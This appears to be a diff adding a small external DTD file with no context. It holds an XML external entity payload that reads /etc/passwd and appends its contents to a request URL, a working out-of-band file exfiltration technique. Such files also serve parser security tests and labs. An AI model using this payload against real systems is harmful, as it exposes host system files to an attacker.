@@ -1,0 +1,4 @@
+<!ENTITY  % passwd SYSTEM "/etc/passwd" >
+<!ENTITY  % wrapper "<!ENTITY send SYSTEM '/?%passwd;'>" >
+%wrapper;
+
